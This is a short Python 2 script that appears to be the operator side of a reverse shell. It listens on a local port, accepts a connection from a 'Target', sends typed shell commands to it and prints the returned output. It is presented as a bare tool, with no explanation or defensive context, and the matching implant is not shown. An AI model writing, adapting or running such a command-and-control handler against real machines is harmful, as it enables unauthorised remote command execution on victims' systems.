#!/usr/bin/python
import socket

s = socket.socket(socket. AF_INET, socket.SOCK_STREAM)
s.setsockopt (socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind (("127.0.0.1",54321))
s.listen(5)
print("Listening for Incoming connections")
target, ip = s.accept()
print("Target Connected!")
while True:
    command = raw_input("* Shell#-%s: " % str(ip))
    target.send(command)
    if command == 'q':
        break
    else:
        result = target.recv(1024)
        print(result)
s.close()